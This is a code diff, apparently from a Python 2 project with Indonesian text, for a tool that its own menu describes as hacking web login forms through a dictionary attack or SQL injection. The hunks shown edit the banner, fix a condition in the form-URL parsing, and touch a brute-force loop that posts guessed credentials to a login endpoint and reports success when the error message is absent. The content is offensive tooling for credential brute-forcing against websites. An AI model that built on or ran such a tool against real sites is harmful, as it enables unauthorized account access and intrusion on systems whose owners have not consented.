@@ -6,8 +6,8 @@ import string
 
 def showAllHelp():
     print("\n-------------------------------")
-    print("LIST PERINTAH UNTUK MELAKUKAN PROGRAM XXX\n")
-    print("-'dictionary' = Untuk melakukan hacking terhadap web login dengan dictionary attack\n")
+    print("LIST PERINTAH UNTUK MELAKUKAN PROGRAM H|4|C|K  L|0|G:\n")
+    print("-'dictionary' = Untuk melakukan hacking terhadap web login dengan dictionary attack")
     print("-'sql' = Untuk melakukan hacking terhadap web login dengan sql")
     print("-'keluar' / 'quit' / 'exit' = Keluar dari program")
     print("\n-------------------------------")
@@ -21,7 +21,7 @@ def sqlHack():
 
     # buat setup link request untuk di bruteforce agar fleksibel tiap form (cleansing)
     form_action_url = ambiltag.getFormAction(html_ekstrak)
-    if form_action_url != None or form_action_url != "":
+    if form_action_url != None:
 	    link_url_force = ""
 	    pecah = input1.split("/")
 	    pecah2 = form_action_url.split("/")
@@ -77,7 +77,7 @@ def webHack():
 
     # buat setup link request untuk di bruteforce agar fleksibel tiap form (cleansing)
     form_action_url = ambiltag.getFormAction(html_ekstrak)
-    if form_action_url != None or form_action_url != "":
+    if form_action_url != None:
 	    link_url_force = ""
 	    pecah = input1.split("/")
 	    pecah2 = form_action_url.split("/")
@@ -120,5 +120,5 @@ def webHack():
 	    response = requests.post(link_url_force, data1)
 	    if input_err_msg not in response.text:
 		    print x + " Success!"
-		    print response.text
+		    # print response.text
 		    break
